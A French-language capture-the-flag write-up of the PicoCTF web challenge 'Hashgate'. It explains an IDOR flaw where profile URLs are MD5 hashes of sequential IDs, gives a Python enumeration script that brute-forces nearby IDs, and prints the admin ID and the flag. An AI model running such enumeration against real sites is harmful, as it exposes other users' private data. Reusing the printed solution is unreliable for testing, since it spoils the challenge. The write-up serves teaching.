# Writeup PicoCTF - Hashgate

**Challenge :** Hashgate
**Catégorie :** Web Exploitation
**Points :** 100 pts
**Flag :** `picoCTF{id0r_unl0ck_69c48f4b}`

## Description

Le challenge présente un portail organisationnel où l'accès aux profils semble sécurisé par des identifiants non prévisibles dans l'URL. L'objectif est d'accéder au profil de l'administrateur en comprenant comment ces identifiants sont générés.

## Analyse du site

En explorant la page d'accueil, des identifiants d'invité sont fournis dans les commentaires HTML : `guest@picoctf.org:guest`.

### 1. Structure de l'URL de profil

Après connexion, on est redirigé vers l'URL :
`/profile/user/e93028bdc1aacdfb3687181f2031765d`

Le contenu de la page indique :
> "Access level: Guest (**ID: 3000**). Insufficient privileges to view classified data."

### 2. Identification du Hash

Le hash `e93028bdc1aacdfb3687181f2031765d` correspond exactement au **MD5 du nombre 3000**.
Cela confirme que le site utilise une vulnérabilité d'**IDOR** (Insecure Direct Object Reference) où l'ID de l'utilisateur (un simple entier) est masqué par un hash MD5, pensant que cela suffit à sécuriser l'accès.

## Énumération et Exploitation

L'énoncé mentionne qu'il y a environ 20 employés. Il est fort probable que leurs IDs soient proches de celui de l'invité.

### Script de Brute-force

Un script Python a été utilisé pour tester les IDs autour de 3000 (en générant le MD5 de chaque ID et en tentant d'accéder à la page correspondante) :

```python
import requests
import hashlib

base_url = "http://crystal-peak.picoctf.net:52285/profile/user/"
test_ids = list(range(2980, 3030))

for user_id in test_ids:
    user_hash = hashlib.md5(str(user_id).encode()).hexdigest()
    response = requests.get(f"{base_url}{user_hash}")
    
    if "User not found" not in response.text and "Guest" not in response.text:
        print(f"Found Admin at ID {user_id}!")
        print(response.text)
        break
```

### Résultat

L'ID de l'administrateur a été trouvé à l'**ID 3013** (Hash: `4110a1994471c595f7583ef1b74ba4cb`).
La page affiche :
> "Welcome, admin! Here is the flag: picoCTF{id0r_unl0ck_69c48f4b}"

**Flag :** `picoCTF{id0r_unl0ck_69c48f4b}`

## Concepts clés retenus

* **Obscurity != Security** : Utiliser un hash MD5 d'un ID séquentiel n'est pas une mesure de sécurité efficace si la source est facile à deviner.
* **IDOR (Insecure Direct Object Reference)** : Cette vulnérabilité permet d'accéder à des ressources d'autres utilisateurs en modifiant simplement un paramètre d'identification (ici l'ID dans l'URL).
* **Analyse de commentaires** : Toujours vérifier le code source HTML pour des indices ou des identifiants de test oubliés par les développeurs.
